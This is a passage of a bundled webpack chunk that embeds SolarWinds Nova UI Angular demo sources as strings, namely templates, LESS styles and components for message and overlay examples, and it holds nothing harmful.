<b>Simple warning message.</b> Cius dit vellab idunt acestot aturecu.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n\n<nui-message type="warning" (dismiss)="onMessageDismiss()" i18n>\n    <b>Emphasize part.</b> Cius dit vellab idunt acestot aturecu lluptaepe eum\n    qui con ciusae dolenis moditatiusam es dolum sollor aliquam. Cius dit vellab\n    idunt acestot aturecu ciusae dolenis moditatiusam es dolum sollor aliquam.\n    Cius dit vellab idunt acestot aturecu ciusae dolenis moditatiusam es dolum\n    sollor aliquam. Cius dit vellab idunt acestot aturecu ciusae dolenis\n    moditatiusam es dolum sollor aliquam.\n    <a href="../components/MessageComponent.html" target="_blank">Learn More</a>\n</nui-message>\n'},48336:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-message-warning-example",\n    templateUrl: "./message-warning.example.component.html",\n})\nexport class MessageWarningExampleComponent {\n    public onMessageDismiss(): void {\n        console.log("Message was dismissed");\n    }\n}\n'},12483:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    MessageBasicExampleComponent,\n    MessageCriticalExampleComponent,\n    MessageDocsComponent,\n    MessageInfoExampleComponent,\n    MessageManualControlExampleComponent,\n    MessageNotDismissableExampleComponent,\n    MessageOkExampleComponent,\n    MessageTestComponent,\n    MessageVisualTestComponent,\n    MessageWarningExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: MessageDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "message-test",\n        component: MessageTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "message-visual-test",\n        component: MessageVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        MessageBasicExampleComponent,\n        MessageCriticalExampleComponent,\n        MessageDocsComponent,\n        MessageInfoExampleComponent,\n        MessageManualControlExampleComponent,\n        MessageNotDismissableExampleComponent,\n        MessageOkExampleComponent,\n        MessageTestComponent,\n        MessageVisualTestComponent,\n        MessageWarningExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("message"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class MessageModule {}\n'},73349:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./overlay-simple-usage/overlay-simple-usage.example.component";\nexport * from "./overlay-show-hide-toggle/overlay-show-hide-toggle.example.component";\nexport * from "./overlay-custom-styles/overlay-custom-styles.example.component";\nexport * from "./overlay-custom-container/overlay-custom-container.example.component";\nexport * from "./overlay-docs/overlay-docs.example.component";\nexport * from "./overlay-test/overlay-test.example.component";\nexport * from "./overlay-viewport-margin/overlay-viewport-margin-example.component";\nexport * from "./overlay-arrow/overlay-arrow.example.component";\nexport * from "./overlay-popup-styles/overlay-popup-styles.example.component";\nexport * from "./overlay-custom-dialog/overlay-custom-dialog.component";\nexport * from "./overlay-custom-confirmation-inside-dialog/overlay-custom-confirmation-inside-dialog.component";\n'},5351:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="arrow-example">\n    <div class="d-flex justify-content-between align-items-center mb-5">\n        <div class="dnd-button" cdkDrag #draggable="cdkDrag">\n            <button\n                nui-button\n                class="toggle-button"\n                #toggleButton\n                type="button"\n                [isEmpty]="false"\n                (click)="overlay.toggle()"\n                i18n\n            >\n                Draggable toggle\n            </button>\n        </div>\n\n        <button\n            nui-button\n            class="h-50"\n            type="button"\n            [isEmpty]="false"\n            (click)="draggable.reset()"\n            i18n\n        >\n            Reset draggable button\n        </button>\n    </div>\n\n    <nui-overlay\n        #overlay\n        [toggleReference]="toggleButton[\'el\'].nativeElement"\n        [overlayConfig]="overlayConfig"\n    >\n        <img\n            src="https://cdn.stocksnap.io/img-thumbs/960w/thumbs%20up-hand_QUWPLI693K.jpg"\n            alt="Thumbs up"\n            class="w-100"\n        />\n        <nui-overlay-arrow *ngIf="arrowSelectControl.value"></nui-overlay-arrow>\n    </nui-overlay>\n\n    Position:\n    <nui-select-v2\n        placeholder="Select Position"\n        i18n-placeholder\n        [formControl]="positionSelectControl"\n        class="select"\n    >\n        <nui-select-v2-option\n            *ngFor="let position of possiblePositions"\n            [value]="position"\n            >{{ position }}</nui-select-v2-option\n        >\n    </nui-select-v2>\n\n    Arrow:\n    <nui-select-v2\n        placeholder="Select Arrow"\n        i18n-placeholder\n        [formControl]="arrowSelectControl"\n        class="select"\n    >\n        <nui-select-v2-option\n            *ngFor="let arrow of [true, false]"\n            [value]="arrow"\n            >{{ arrow }}</nui-select-v2-option\n        >\n    </nui-select-v2>\n</div>\n'},28307:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) url("mixins.less");\n\n.arrow-example {\n    @button-width: 180px;\n    @button-height: 50px;\n\n    .toggle-button {\n        height: @button-height;\n        width: @button-width;\n    }\n\n    .dnd-button {\n        width: @button-width;\n        height: @button-height;\n        .setCssVariable(background-color, nui-color-bg-content);\n    }\n\n    .select {\n        width: 200px;\n        margin: 15px;\n    }\n}\n\n.custom-overlay-panel-class {\n    width: 300px;\n}\n'},25567:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    FlexibleConnectedPositionStrategy,\n    OverlayConfig,\n} from "@angular/cdk/overlay";\nimport {\n    AfterViewInit,\n    Component,\n    OnDestroy,\n    ViewChild,\n    ViewEncapsulation,\n} from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    IOverlayPositionServiceConfig,\n    OverlayComponent,\n    OverlayPlacement,\n} from "@nova-ui/bits";\n\nconst CUSTOM_OVERLAY_PANEL_CLASS = "custom-overlay-panel-class";\n\n@Component({\n    selector: "nui-overlay-arrow-example",\n    templateUrl: "./overlay-arrow.example.component.html",\n    styleUrls: ["./overlay-arrow.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class OverlayArrowExampleComponent implements AfterViewInit, OnDestroy {\n    private readonly destroy$ = new Subject<void>();\n\n    public possiblePositions: OverlayPlacement[] = [\n        OverlayPlacement.Top,\n        OverlayPlacement.Bottom,\n        OverlayPlacement.Left,\n        OverlayPlacement.Right,\n    ];\n\n    public overlayConfig: OverlayConfig = {\n        panelClass: [CUSTOM_OVERLAY_PANEL_CLASS],\n    };\n\n    public positionSelectControl = new FormControl(this.possiblePositions[0], {\n        nonNullable: true,\n    });\n    public arrowSelectControl = new FormControl(true);\n    @ViewChild(OverlayComponent) public overlay: OverlayComponent;\n\n    public ngAfterViewInit(): void {\n        this.handlePosition();\n\n        this.overlay.clickOutside\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((_) => this.overlay.hide());\n    }\n\n    public handlePosition(): void {\n        // set the positions when showing the popup\n        this.overlay.show$.subscribe(() => {\n            this.overlay.overlayPositionService.setOverlayPositionConfig(\n                this.getPositionServiceConfig()\n            );\n            // get available positions for the overlay from overlay.overlayPositionService\n            const availablePositions =\n                this.overlay.overlayPositionService.getPossiblePositionsForPlacement(\n                    this.positionSelectControl.value\n                );\n            // FlexibleConnectedPositionStrategy is default strategy of overlay component.\n            const positionStrategy = this.overlay.getOverlayRef().getConfig()\n                .positionStrategy as FlexibleConnectedPositionStrategy;\n            positionStrategy\n                // !!! using default \'30\' value breaks the edges, when displaying overlay from right, for the sake of the example, it\'s set to \'0\'.\n                .withViewportMargin(0)\n                .withPositions(availablePositions);\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n\n    private getPositionServiceConfig():\n        | IOverlayPositionServiceConfig\n        | undefined {\n        const isArrowNeeded = this.arrowSelectControl.value;\n        // define config with NO paddings for the overlay in case there\'s no arrow\n        const noArrowCfg = {\n            arrowPadding: 0, // you can use custom numbers here\n            arrowSize: 0, // you can use custom numbers here\n        };\n\n        // \'undefined\' is set to take default paddings and arrow size as in the style guides.\n        const positionServiceConfig = isArrowNeeded ? undefined : noArrowCfg;\n\n        return positionServiceConfig;\n    }\n}\n'},67671:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    id="nui-demo-default-dialog-btn"\n    nui-button\n    type="button"\n    (click)="open(content)"\n    i18n\n>\n    Click me!\n</button>\n\n<ng-template #content let-close="close" let-dismiss="dismiss">\n    <div\n        #dialog\n        nuiResizeObserver\n        (containerResize)="onContainerResize(overlay)"\n    >\n        <nui-dialog-header\n            title="Dialog title"\n            i18n-title\n            (closed)="close()"\n        ></nui-dialog-header>\n        <div class="dialog-body">\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n                maximus faucibus bibendum. Aenean feugiat interdum leo sed\n                posuere. Etiam at pulvinar enim, nec interdum purus. Duis elit\n                metus, lobortis vitae quam a, malesuada cursus quam. Duis vel\n                lacinia purus. Maecenas eget arcu ac ante sagittis eleifend vel\n                ut purus. Pellentesque sit amet semper ipsum, eu vulputate\n                tortor. Aliquam vitae nisi augue. Duis non erat sit amet sem\n                venenatis accumsan at ullamcorper lorem. Morbi non turpis nibh.\n            </p>\n        </div>\n        <nui-dialog-footer>\n            <button\n                nui-button\n                type="button"\n                (click)="triggerOverlay(overlay)"\n                i18n\n            >\n                Cancel\n            </button>\n            <button\n                nui-button\n                type="button"\n                displayStyle="primary"\n                (click)="actionDone(); close()"\n                i18n\n            >\n                Action\n            </button>\n        </nui-dialog-footer>\n    </div>\n    \x3c!-- By setting the [toggleReference] below we choose the container to apply our overlay to. The chosen container \n         can later be accessed via the overlay\'s \'overlayRef\' --\x3e\n    <nui-overlay #overlay [toggleReference]="dialog">\n        <div class="overlay-class">\n            <div class="overlay-content">\n                <div class="header">Are you sure you want to quit?</div>\n                <div class="footer">\n                    <button\n                        nui-button\n                        displayStyle="action"\n                        type="button"\n                        (click)="overlay.hide()"\n                    >\n                        No\n                    </button>\n                    <button\n                        nui-button\n                        type="button"\n                        (click)="overlay.hide(); close()"\n                    >\n                        Yes\n                    </button>\n                </div>\n            </div>\n        </div>\n    </nui-overlay>\n</ng-template>\n\n<ng-template #longContent let-close="close">\n    <div\n        #dialogLarge\n        nuiResizeObserver\n        (containerResize)="onContainerResize(overlayLarge)"\n    >\n        <nui-dialog-header\n            title="Dialog title"\n            i18n-title\n            (closed)="close()"\n        ></nui-dialog-header>\n        <div class="dialog-body">\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n                maximus faucibus bibendum. Aenean feugiat interdum leo sed\n                posuere. Etiam at pulvinar enim, nec interdum purus. Duis elit\n                metus, lobortis vitae quam a, malesuada cursus quam. Duis vel\n                lacinia purus. Maecenas eget arcu ac ante sagittis eleifend vel\n                ut purus. Pellentesque sit amet semper ipsum, eu vulputate\n                tortor. Aliquam vitae nisi augue. Duis non erat sit amet sem\n                venenatis accumsan at ullamcorper lorem. Morbi non turpis nibh.\n            </p>\n\n            <p i18n>\n                Quisque ut pellentesque augue. Ut finibus malesuada lacus, a\n                elementum odio eleifend ac. Duis faucibus vehicula elit.\n                Pellentesque id metus enim. Praesent vestibulum ipsum vel\n                venenatis vehicula. Donec vel erat ex. Vivamus porta risus vitae\n                risus tempus accumsan.\n            </p>\n\n            <p i18n>\n                Duis euismod erat id metus euismod, interdum iaculis turpis\n                tempus. Nulla facilisi. Pellentesque ut purus nec lorem aliquam\n                dictum ut sit amet enim. Mauris laoreet vel mi eget suscipit.\n                Aliquam ipsum lacus, varius sed felis non, aliquet ultrices\n                nisl. In tincidunt quam sed faucibus vulputate. Lorem ipsum\n                dolor sit amet, consectetur adipiscing elit. Duis pellentesque\n                elit sem, id aliquet metus egestas sit amet. Maecenas quis justo\n                in turpis lacinia aliquet. Donec dignissim dolor nunc, in\n                ultricies ligula sodales tincidunt. Phasellus in nisi ac metus\n                rutrum efficitur eu sed mi. Praesent et porta leo. Curabitur sed\n                maximus lectus. Aenean ac ex metus. Integer facilisis id sapien\n                quis sodales. Nam at eros sapien.\n            </p>\n\n            <p i18n>\n                Mauris consequat lectus diam. Cras auctor vestibulum lectus, id\n                pharetra nisl dapibus id. Sed tempor enim vel diam tincidunt\n                condimentum. Ut elementum, ante in ultricies pulvinar, elit\n                metus faucibus mauris, eu sodales lectus risus sit amet odio.\n                Sed ullamcorper maximus ante, ut lobortis libero rutrum lacinia.\n                Nam pretium erat ac velit egestas rutrum ultrices vel libero.\n                Etiam sollicitudin tempus leo. Quisque a elit a orci fringilla\n                molestie. Curabitur luctus dui risus, eget commodo lectus\n                ullamcorper sit amet. Nulla turpis ante, venenatis tempor ex\n                semper, semper vulputate enim. Duis sem nulla, egestas eu\n                rhoncus et, egestas malesuada neque.\n            </p>\n\n            <p i18n>\n                Fusce ut malesuada est. Ut ut placerat nunc. Vivamus mauris\n                nisi, luctus nec turpis quis, luctus porta ante. Aliquam erat\n                volutpat. Nulla facilisi. Maecenas id vehicula sem. Sed vitae\n                sodales orci, sed pretium mauris. Maecenas orci est, volutpat\n                sit amet elit in, gravida finibus justo. Vestibulum eget eros id\n                risus elementum interdum eu quis nisi. Donec ullamcorper enim\n                tincidunt, volutpat sem et, gravida sem. Fusce vitae tellus\n                mauris. Nam non bibendum urna. Ut vel pellentesque est, quis\n                egestas ex. Nam lobortis quam eget arcu tristique, id suscipit\n                enim volutpat. Quisque pretium vel nisl eu aliquet.\n            </p>\n        </div>\n        <nui-dialog-footer>\n            <button\n                nui-button\n                type="button"\n                (click)="triggerOverlay(overlayLarge)"\n                i18n\n            >\n                Cancel\n            </button>\n            <button\n                nui-button\n                type="button"\n                displayStyle="primary"\n                (click)="actionDone(); close()"\n                i18n\n            >\n                Action\n            </button>\n        </nui-dialog-footer>\n    </div>\n\n    <nui-overlay #overlayLarge [toggleReference]="dialogLarge">\n        <div class="overlay-class">\n            <div class="overlay-content">\n                <div class="header">\n                    <nui-icon icon="status_critical"></nui-icon>\n                    <span>Confirmation Title with Severity</span>\n                </div>\n                <div class="body">\n                    <p>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Nullam maximus faucibus bibendum. Aenean feugiat\n                        interdum leo sed posuere. Etiam at pulvinar enim, nec\n                        interdum purus.\n                    </p>\n                </div>\n                <div class="footer">\n                    <button\n                        nui-button\n                        displayStyle="action"\n                        type="button"\n                        (click)="overlayLarge.hide()"\n                    >\n                        Cancel\n                    </button>\n                    <button\n                        nui-button\n                        type="button"\n                        (click)="overlayLarge.hide(); close()"\n                    >\n                        Yes\n                    </button>\n                </div>\n            </div>\n        </div>\n    </nui-overlay>\n</ng-template>\n\n<button class="ml-3" nui-button type="button" (click)="open(longContent)" i18n>\n    Larger Content\n</button>\n'},84323:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-colors";\n@import (reference) "nui-framework-spaces";\n@import (reference) "nui-framework-typography";\n\n.overlay {\n    &-class {\n        // background: radial-gradient(circle, rgba(255,255,255,0.94) 70%, rgba(255,255,255,0) 100%);\n        display: flex;\n        height: 100%;\n        .setCssVariable(background-color, nui-color-overlay-busy);\n    }\n\n    &-content {\n        display: flex;\n        flex-direction: column;\n        justify-content: center;\n        max-width: 460px;\n        margin: auto;\n        padding: (@nui-space-md * 2);\n        .setCssVariable(background-color, nui-color-bg-content);\n        box-shadow: @nui-shadow-elevated;\n        // background: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, @nui-color-bg-content 5%, @nui-color-bg-content 95%, rgba(0, 0, 0, 0) 100%);\n\n        .header {\n            display: flex;\n            justify-content: center;\n            margin-bottom: @nui-space-md;\n            .nui-text-widget();\n\n            nui-icon {\n                margin-right: @nui-space-xs;\n            }\n        }\n\n        .body {\n            display: flex;\n            text-align: center;\n            .nui-text-size(default);\n        }\n\n        .footer {\n            display: flex;\n            flex-direction: row;\n            justify-content: center;\n\n            button[displayStyle="action"] {\n                margin-right: @nui-space-md;\n            }\n        }\n    }\n}\n\nbutton[displayStyle="action"] {\n    margin-right: @nui-space-md;\n}\n\nh1 {\n    margin-bottom: @nui-space-md;\n}\n'},76143:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    FlexibleConnectedPositionStrategy,\n    OverlayRef,\n} from "@angular/cdk/overlay";\nimport { Component, OnDestroy, TemplateRef } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport { DialogService, NuiDialogRef, OverlayComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-custom-confirmation-inside-dialog",\n    templateUrl: "./overlay-custom-confirmation-inside-dialog.component.html",\n    styleUrls: ["./overlay-custom-confirmation-inside-dialog.component.less"],\n})\nexport class CustomConfirmationInsideDialogComponent implements OnDestroy {\n    public onDestroy$ = new Subject<void>();\n    public overlayTriggered$ = new Subject<void>();\n\n    private overlayRef: OverlayRef;\n    private activeDialog: NuiDialogRef;\n\n    constructor(private dialogService: DialogService) {}\n\n    triggerOverlay(overlay: OverlayComponent): void {\n        this.overlayTriggered$.next();\n\n        // Toggling the overlay to get an access to the \'overlayRef\'\n        overlay.toggle();\n\n        this.overlayRef = overlay.getOverlayRef();\n        // Here we update the positions for the overlay. By default, the overlay service connects the overlay to the bottom-left\n        // corner of the toggle reference element. We change this behavior here by setting new positions, since we want overlay to\n        // stick to the upper-top corner of the parent container\n        (\n            this.overlayRef.getConfig()\n                .positionStrategy as FlexibleConnectedPositionStrategy\n        ).withPositions([\n            {\n                originX: "start",\n                originY: "top",\n                overlayX: "start",\n                overlayY: "top",\n            },\n        ]);\n        // We update the size of the overlay container to follow the dimentions of the new \'toggle reference\' container we set in the very first step\n        this.updateOverlayDimensions(overlay);\n\n        // Handling ESC events inside overlay\n        this.activeDialog?.closed$\n            .pipe(takeUntil(this.overlayTriggered$), takeUntil(this.onDestroy$))\n            .subscribe(() => overlay.hide());\n    }\n\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "lg",\n            backdrop: "static",\n            useOverlay: true,\n        });\n    }\n\n    public actionDone(): void {\n        this.activeDialog.close();\n    }\n\n    public onContainerResize(overlay: OverlayComponent): void {\n        this.updateOverlayDimensions(overlay);\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n        this.overlayTriggered$.complete();\n    }\n\n    private updateOverlayDimensions(overlay: OverlayComponent) {\n        this.overlayRef?.updateSize({\n            width: overlay.toggleReference.getBoundingClientRect().width,\n            height: overlay.toggleReference.getBoundingClientRect().height,\n        });\n    }\n}\n'},81393:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="row">\n    <div class="col customContainer">\n        <div>Overlay component with Custom Container (via .class)</div>\n        <button\n            nui-button\n            #toggleButton2\n            type="button"\n            (click)="overlay1.toggle()"\n            i18n\n        >\n            Click\n        </button>\n    </div>\n    <div class="col" #customContainerId>\n        <div>Overlay component with Custom Container (via ElementRef)</div>\n        <button\n            nui-button\n            #toggleButton1\n            type="button"\n            (click)="overlay2.toggle()"\n            i18n\n        >\n            Click\n        </button>\n    </div>\n</div>\n\n<nui-overlay\n    #overlay1\n    [toggleReference]="toggleButton2[\'el\'].nativeElement"\n    [customContainer]="\'.customContainer\'"\n    [overlayConfig]="overlayConfig"\n>\n    <ng-container *ngFor="let item of itemsSource">\n        <nui-overlay-item class="list-item">{{ item }}</nui-overlay-item>\n    </ng-container>\n</nui-overlay>\n\n<nui-overlay\n    #overlay2\n    [toggleReference]="toggleButton1[\'el\'].nativeElement"\n    [customContainer]="customContainer"\n    [overlayConfig]="overlayConfig"\n>\n    <ng-container *ngFor="let item of itemsSource">\n        <nui-overlay-item class="list-item">{{ item }}</nui-overlay-item>\n    </ng-container>\n</nui-overlay>\n'},17341:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport {\n    ChangeDetectionStrategy,\n    Component,\n    ElementRef,\n    ViewChild,\n    ViewEncapsulation,\n} from "@angular/core";\n\nimport { OVERLAY_WITH_POPUP_STYLES_CLASS } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-overlay-custom-container-example",\n    templateUrl: "./overlay-custom-container.example.component.html",\n    encapsulation: ViewEncapsulation.None,\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class OverlayCustomContainerExampleComponent {\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n\n    @ViewChild("customContainerId", { static: true })\n    customContainer: ElementRef;\n\n    public overlayConfig: OverlayConfig = {\n        panelClass: OVERLAY_WITH_POPUP_STYLES_CLASS,\n    };\n}\n'},87383:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="d-flex nested-row" #parent>\n        <div class="w-100 h-100 col">\n            <div class="container nested-row nested-row__child" #child1>\n                Click the button below to trigger overlay over this text\n            </div>\n            <button\n                nui-button\n                type="button"\n                class="mt-3 mr-auto ml-auto d-flex"\n                (click)="triggerOverlay(child1, overlay1)"\n            >\n                Toggle Overlay\n            </button>\n        </div>\n    </div>\n    <button\n        nui-button\n        type="button"\n        class="mt-3 mr-auto ml-auto d-flex"\n        (click)="triggerOverlay(parent, overlay2)"\n    >\n        Toggle General Overlay\n    </button>\n</div>\n\n<nui-overlay #overlay1>\n    <div class="h-100 overlay-class_1">\n        <div\n            class="h-100 container d-flex flex-column justify-content-center align-items-center"\n        >\n            <h1>Overlay</h1>\n            <p>(opacity: 0.7)</p>\n        </div>\n    </div>\n</nui-overlay>\n\n<nui-overlay #overlay2>\n    <div class="h-100 overlay-class_2">\n        <div\n            class="h-100 container d-flex flex-column justify-content-center align-items-center"\n        >\n            <h1>Overlay 2</h1>\n            <p>(opacity: 0.8)</p>\n        </div>\n    </div>\n</nui-overlay>\n'},73411:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nested-row {\n    min-height: 200px;\n    border: 1px #222 dashed;\n    padding: 1em;\n    height: 100%;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    text-align: center;\n\n    &__child {\n        margin: 